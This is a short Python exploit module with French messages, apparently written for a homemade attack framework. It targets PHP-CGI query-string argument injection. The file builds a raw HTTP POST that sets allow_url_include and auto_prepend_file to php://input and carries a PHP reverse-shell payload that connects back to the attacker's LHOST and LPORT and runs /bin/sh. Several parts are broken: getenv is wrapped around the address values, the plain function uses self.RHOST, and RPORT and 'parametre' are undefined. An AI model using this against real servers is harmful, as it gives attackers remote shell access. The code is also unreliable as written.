from colorama import init, Fore
import socket
import sys

init(autoreset=True)
arguments_requid=['RHOSTS','LHOST','LPORT']


def exploit(parametres):
    try:
        pwn_code = '<?php $sock=fsockopen(getenv("{lhost}"),getenv("{lport}"));exec("/bin/sh -i <&3 >&3 2>&3"); ?>'.format(lhost=parametres['LHOST'],lport=parametres['LPORT'])
        post_Length = len(pwn_code)
        http_raw="""
        POST /?-dallow_url_include%%3don+-dauto_prepend_file%%3dphp://input HTTP/1.1
        Host: %s
        Content-Type: application/x-www-form-urlencoded
        Content-Length: %s
        %s
        """ %(parametres['RHOSTS'] , post_Length ,pwn_code)
    except KeyError as exception:
        print('[+] {} ne pas défini !'.format(exception.__str__()))
        return
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.RHOST, int(RPORT)))
        sock.send(bytes(http_raw,encoding='ascii'))
        data = sock.recv(10000)
        print(repr(data))
        sock.close()
    except socket.error as msg:
        print(Fore.RED + "Impossible d\'exploitée cette vulnerabilité")


def notice():
    print(Fore.RED + "CODE : Est le code ecrit en PHP que vous souhaitez executer sur la cible")


def auto_args(parametres):
    parametre['RPORTS'] = 80
